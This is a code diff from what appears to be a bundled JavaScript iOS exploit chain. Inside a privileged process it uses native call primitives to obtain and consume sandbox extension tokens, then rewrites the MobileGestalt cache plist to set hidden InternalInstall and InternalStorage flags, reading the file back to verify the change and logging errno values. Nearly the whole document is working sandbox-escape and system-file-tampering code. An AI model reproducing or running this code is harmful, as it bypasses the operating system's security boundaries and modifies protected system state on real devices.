@@ -8911,19 +8911,47 @@ function start() { LOG("[+] PE start() called");
 			const MGNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 			const GESTALT_PATH = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
 
-			// Consume sandbox token for the MobileGestalt plist path in this
-			// process (mediaplaybackd). createTokens() already issued tokens
-			// and consumed for the parent directory, but we need the exact
-			// file path consumed in our process context for open() to succeed.
-			LOG("[MG] Consuming sandbox token for MG plist path...");
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath(GESTALT_PATH, true);
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/", true);
+			// Issue + consume sandbox tokens. sandbox_extension_consume returns
+			// a handle >= 0 on success, -1 on failure. Log the result so we can
+			// tell if the token was actually accepted by the kernel.
+			LOG("[MG] Issuing sandbox tokens...");
+			let tok1 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath(GESTALT_PATH, false);
+			LOG("[MG] token for plist: " + (tok1 ? tok1.substring(0, 60) + "..." : "FAILED (null)"));
+			if (tok1) {
+				MGNative.writeString(MGNative.mem, tok1);
+				let consumeRet1 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(plist) = " + consumeRet1 + (consumeRet1 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+			let tok2 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/", false);
+			LOG("[MG] token for dir: " + (tok2 ? tok2.substring(0, 60) + "..." : "FAILED (null)"));
+			if (tok2) {
+				MGNative.writeString(MGNative.mem, tok2);
+				let consumeRet2 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(dir) = " + consumeRet2 + (consumeRet2 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+
+			// Also consume tokens for /private/var variant (iOS resolves symlinks)
+			let tok3 = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private" + GESTALT_PATH, false);
+			if (tok3) {
+				MGNative.writeString(MGNative.mem, tok3);
+				let consumeRet3 = MGNative.callSymbol("sandbox_extension_consume", MGNative.mem);
+				LOG("[MG] consume(/private plist) = " + consumeRet3 + (consumeRet3 >= 0 ? " (OK)" : " (FAILED)"));
+			}
+
+			// Check errno helper
+			function mgErrno() { return MGNative.callSymbol("__error"); }
+			function mgGetErrno() {
+				let ep = mgErrno();
+				if (!ep) return "?";
+				let buf = MGNative.read(ep, 4);
+				return new DataView(buf).getInt32(0, true);
+			}
 
 			// 1. Read the existing plist file
 			LOG("[MG] Opening " + GESTALT_PATH + " for read...");
 			let fd = MGNative.callSymbol("open", GESTALT_PATH, 0n); // O_RDONLY
-			LOG("[MG] open(RDONLY) fd = " + fd);
-			if (!fd || Number(fd) < 0) throw "cannot open for read fd=" + fd;
+			LOG("[MG] open(RDONLY) fd = " + fd + " errno=" + mgGetErrno());
+			if (!fd || Number(fd) < 0) throw "cannot open for read fd=" + fd + " errno=" + mgGetErrno();
 
 			// Get file size via lseek
 			let fileSize = Number(MGNative.callSymbol("lseek", fd, 0n, 2n)); // SEEK_END
@@ -8947,13 +8975,12 @@ function start() { LOG("[+] PE start() called");
 			LOG("[MG] Parsing plist with CFPropertyList...");
 			let cfData = MGNative.callSymbol("CFDataCreate", 0n, fileBuf, BigInt(fileSize));
 			MGNative.callSymbol("free", fileBuf);
-			LOG("[MG] CFData = 0x" + BigInt.asUintN(64, BigInt(cfData)).toString(16));
 			if (!cfData) throw "CFDataCreate failed";
 
 			let errorPtr = MGNative.callSymbol("calloc", 1n, 8n);
 			// kCFPropertyListMutableContainersAndLeaves = 0x2
 			let plist = MGNative.callSymbol("CFPropertyListCreateWithData", 0n, cfData, 0x2n, 0n, errorPtr);
-			LOG("[MG] plist root = 0x" + BigInt.asUintN(64, BigInt(plist)).toString(16));
+			LOG("[MG] plist = 0x" + BigInt.asUintN(64, BigInt(plist)).toString(16));
 			MGNative.callSymbol("CFRelease", cfData);
 			if (!plist) {
 				MGNative.callSymbol("free", errorPtr);
@@ -8961,7 +8988,6 @@ function start() { LOG("[+] PE start() called");
 			}
 
 			// 3. Get CacheExtra dictionary
-			LOG("[MG] Getting CacheExtra...");
 			let cacheExtraKey = MGNative.callSymbol("CFStringCreateWithCString", 0n, "CacheExtra", 0x08000100n);
 			let cacheExtra = MGNative.callSymbol("CFDictionaryGetValue", plist, cacheExtraKey);
 			LOG("[MG] CacheExtra = 0x" + BigInt.asUintN(64, BigInt(cacheExtra)).toString(16));
@@ -8972,55 +8998,54 @@ function start() { LOG("[+] PE start() called");
 				throw "CacheExtra key not found in plist";
 			}
 
-			// 4. Set InternalInstall (EqrsVvjcYDdxHBiQmGhAWw) = 1
-			//    Set InternalStorage (LBJfwOEzExRxzlAnSuI7eg) = 1
-			// Nugget uses integer 1 (not boolean true) - binary plist
-			// distinguishes between the two types and MobileGestalt
-			// may only check for integer.
-			LOG("[MG] Setting InternalInstall + InternalStorage = 1...");
+			// Check pre-patch values
 			let key1 = MGNative.callSymbol("CFStringCreateWithCString", 0n, "EqrsVvjcYDdxHBiQmGhAWw", 0x08000100n);
 			let key2 = MGNative.callSymbol("CFStringCreateWithCString", 0n, "LBJfwOEzExRxzlAnSuI7eg", 0x08000100n);
-			// Create CFNumber with integer value 1 (matching Nugget's plistlib output)
+			let pre1 = MGNative.callSymbol("CFDictionaryGetValue", cacheExtra, key1);
+			let pre2 = MGNative.callSymbol("CFDictionaryGetValue", cacheExtra, key2);
+			LOG("[MG] PRE-PATCH InternalInstall=" + (pre1 ? "0x" + BigInt.asUintN(64, BigInt(pre1)).toString(16) : "MISSING") + " InternalStorage=" + (pre2 ? "0x" + BigInt.asUintN(64, BigInt(pre2)).toString(16) : "MISSING"));
+
+			// 4. Set InternalInstall + InternalStorage = integer 1
 			// kCFNumberSInt64Type = 4
 			let valBuf = MGNative.callSymbol("calloc", 1n, 8n);
 			let oneBytes = new ArrayBuffer(8);
 			new DataView(oneBytes).setBigInt64(0, 1n, true);
 			MGNative.write(valBuf, oneBytes);
 			let cfOne = MGNative.callSymbol("CFNumberCreate", 0n, 4n, valBuf);
-			LOG("[MG] cfOne = 0x" + BigInt.asUintN(64, BigInt(cfOne)).toString(16));
 			MGNative.callSymbol("free", valBuf);
 			if (!cfOne) throw "CFNumberCreate failed";
 
 			MGNative.callSymbol("CFDictionarySetValue", cacheExtra, key1, cfOne);
-			LOG("[MG] Set EqrsVvjcYDdxHBiQmGhAWw (InternalInstall) = 1");
 			MGNative.callSymbol("CFDictionarySetValue", cacheExtra, key2, cfOne);
-			LOG("[MG] Set LBJfwOEzExRxzlAnSuI7eg (InternalStorage) = 1");
+
+			// Verify the values were actually set by reading them back from the dict
+			let post1 = MGNative.callSymbol("CFDictionaryGetValue", cacheExtra, key1);
+			let post2 = MGNative.callSymbol("CFDictionaryGetValue", cacheExtra, key2);
+			LOG("[MG] POST-PATCH InternalInstall=0x" + BigInt.asUintN(64, BigInt(post1)).toString(16) + " InternalStorage=0x" + BigInt.asUintN(64, BigInt(post2)).toString(16));
+			LOG("[MG] values match cfOne? install=" + (post1 === cfOne || BigInt(post1) === BigInt(cfOne)) + " storage=" + (post2 === cfOne || BigInt(post2) === BigInt(cfOne)));
 
 			MGNative.callSymbol("CFRelease", key1);
 			MGNative.callSymbol("CFRelease", key2);
 			MGNative.callSymbol("CFRelease", cfOne);
 
 			// 5. Serialize back to binary plist
-			LOG("[MG] Serializing modified plist...");
 			// kCFPropertyListBinaryFormat_v1_0 = 200
 			let outData = MGNative.callSymbol("CFPropertyListCreateData", 0n, plist, 200n, 0n, errorPtr);
-			LOG("[MG] outData = 0x" + BigInt.asUintN(64, BigInt(outData)).toString(16));
 			MGNative.callSymbol("CFRelease", plist);
 			MGNative.callSymbol("free", errorPtr);
 			if (!outData) throw "CFPropertyListCreateData failed";
 
 			let outPtr = MGNative.callSymbol("CFDataGetBytePtr", outData);
 			let outLen = Number(MGNative.callSymbol("CFDataGetLength", outData));
-			LOG("[MG] serialized plist: " + outLen + " bytes");
+			LOG("[MG] serialized: " + outLen + " bytes (original was " + fileSize + ")");
 
 			// 6. Write back to file (truncate + write)
-			LOG("[MG] Writing modified plist to " + GESTALT_PATH);
 			// O_WRONLY | O_TRUNC = 0x0201
 			let fdOut = MGNative.callSymbol("open", GESTALT_PATH, 0x0201n, 0o644n);
-			LOG("[MG] open(WRONLY|TRUNC) fd = " + fdOut);
+			LOG("[MG] open(WR|TRUNC) fd=" + fdOut + " errno=" + mgGetErrno());
 			if (!fdOut || Number(fdOut) < 0) {
 				MGNative.callSymbol("CFRelease", outData);
-				throw "cannot open for write fd=" + fdOut;
+				throw "cannot open for write fd=" + fdOut + " errno=" + mgGetErrno();
 			}
 
 			let totalWritten = 0;
@@ -9028,19 +9053,59 @@ function start() { LOG("[+] PE start() called");
 				let chunk = Math.min(outLen - totalWritten, 32768);
 				let w = Number(MGNative.callSymbol("write", fdOut, outPtr + BigInt(totalWritten), BigInt(chunk)));
 				if (w <= 0) {
-					LOG("[MG] write() returned " + w + " at offset " + totalWritten);
+					LOG("[MG] write() returned " + w + " errno=" + mgGetErrno() + " at offset " + totalWritten);
 					break;
 				}
 				totalWritten += w;
 			}
-			MGNative.callSymbol("fsync", fdOut);
+			let fsyncRet = MGNative.callSymbol("fsync", fdOut);
+			LOG("[MG] fsync=" + fsyncRet + " errno=" + mgGetErrno());
 			MGNative.callSymbol("close", fdOut);
 			MGNative.callSymbol("CFRelease", outData);
+			LOG("[MG] wrote " + totalWritten + "/" + outLen + " bytes");
 
-			if (totalWritten === outLen) {
-				LOG("[MG] SUCCESS: Wrote " + totalWritten + "/" + outLen + " bytes (InternalInstall + InternalStorage set)");
+			// 7. VERIFY: re-read the file and check keys are present
+			LOG("[MG] === VERIFICATION: re-reading file ===");
+			let vfd = MGNative.callSymbol("open", GESTALT_PATH, 0n);
+			LOG("[MG] verify open fd=" + vfd + " errno=" + mgGetErrno());
+			if (vfd && Number(vfd) >= 0) {
+				let vsize = Number(MGNative.callSymbol("lseek", vfd, 0n, 2n));
+				LOG("[MG] verify file size=" + vsize + " (wrote " + totalWritten + ")");
+				MGNative.callSymbol("lseek", vfd, 0n, 0n);
+				let vbuf = MGNative.callSymbol("malloc", BigInt(vsize + 16));
+				let vread = Number(MGNative.callSymbol("read", vfd, vbuf, BigInt(vsize)));
+				MGNative.callSymbol("close", vfd);
+				LOG("[MG] verify read=" + vread + " bytes");
+				if (vread === vsize) {
+					let vcfdata = MGNative.callSymbol("CFDataCreate", 0n, vbuf, BigInt(vsize));
+					let verrp = MGNative.callSymbol("calloc", 1n, 8n);
+					let vplist = MGNative.callSymbol("CFPropertyListCreateWithData", 0n, vcfdata, 0n, 0n, verrp);
+					MGNative.callSymbol("CFRelease", vcfdata);
+					if (vplist) {
+						let vceKey = MGNative.callSymbol("CFStringCreateWithCString", 0n, "CacheExtra", 0x08000100n);
+						let vce = MGNative.callSymbol("CFDictionaryGetValue", vplist, vceKey);
+						MGNative.callSymbol("CFRelease", vceKey);
+						if (vce) {
+							let vk1 = MGNative.callSymbol("CFStringCreateWithCString", 0n, "EqrsVvjcYDdxHBiQmGhAWw", 0x08000100n);
+							let vk2 = MGNative.callSymbol("CFStringCreateWithCString", 0n, "LBJfwOEzExRxzlAnSuI7eg", 0x08000100n);
+							let vv1 = MGNative.callSymbol("CFDictionaryGetValue", vce, vk1);
+							let vv2 = MGNative.callSymbol("CFDictionaryGetValue", vce, vk2);
+							LOG("[MG] VERIFY InternalInstall=" + (vv1 ? "PRESENT(0x" + BigInt.asUintN(64, BigInt(vv1)).toString(16) + ")" : "MISSING"));
+							LOG("[MG] VERIFY InternalStorage=" + (vv2 ? "PRESENT(0x" + BigInt.asUintN(64, BigInt(vv2)).toString(16) + ")" : "MISSING"));
+							MGNative.callSymbol("CFRelease", vk1);
+							MGNative.callSymbol("CFRelease", vk2);
+						} else {
+							LOG("[MG] VERIFY FAIL: CacheExtra missing from re-read plist");
+						}
+						MGNative.callSymbol("CFRelease", vplist);
+					} else {
+						LOG("[MG] VERIFY FAIL: could not parse re-read plist");
+					}
+					MGNative.callSymbol("free", verrp);
+				}
+				MGNative.callSymbol("free", vbuf);
 			} else {
-				LOG("[MG] PARTIAL WRITE: " + totalWritten + "/" + outLen + " bytes");
+				LOG("[MG] VERIFY FAIL: could not re-open file errno=" + mgGetErrno());
 			}
 
 		} catch (mgErr) {
